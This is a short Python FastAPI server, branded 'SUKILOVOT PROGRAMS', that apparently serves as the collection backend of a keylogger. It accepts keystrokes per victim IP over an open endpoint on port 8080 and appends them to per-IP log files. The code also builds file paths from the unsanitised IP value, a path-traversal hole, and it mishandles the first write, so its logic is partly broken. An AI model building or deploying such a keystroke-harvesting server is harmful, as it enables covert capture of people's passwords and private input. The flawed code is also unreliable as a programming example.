from fastapi import FastAPI
from uvicorn import run

api = FastAPI(debug=True)

@api.get("/key/{key}/{ip}")
def key_pressed(key, ip):
    key = str(key)
    ip = str(ip)

    try:
        past_content = open(f"logs/{ip}.log", "r").read()
    except:
        past_content = open(f"logs/{ip}.log", "w").write("### SUKILOVOT PROGRAMS ###\n\n")

    open(f"logs/{ip}.log", "w").write(past_content + f"\n{key}")
    return {"request": "worked", "creator": "SUKILOVOT", "ABIN, me contrata": ":)"}

run(app=api, debug=True, host="0.0.0.0", port=8080)
